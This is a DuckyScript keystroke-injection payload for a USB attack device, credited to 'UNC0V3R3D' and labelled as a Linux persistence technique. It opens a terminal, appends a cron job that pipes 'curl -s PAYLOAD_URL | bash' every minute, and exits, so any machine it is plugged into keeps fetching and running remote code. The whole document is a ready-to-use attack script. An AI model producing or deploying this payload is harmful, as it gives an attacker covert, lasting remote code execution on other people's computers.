REM Author: UNC0V3R3D
REM Description: Installs a cron job that runs a payload every minute for persistence.
REM Version: 1.0
REM Category: Persistence
REM Target: Linux (all distros)
REM Requirements: cron/crontab available
DELAY 1000
CTRL ALT t
DELAY 1500
STRING (crontab -l 2>/dev/null; echo "* * * * * curl -s PAYLOAD_URL | bash") | crontab -
ENTER
DELAY 500
STRING exit
ENTER
REM End of payload
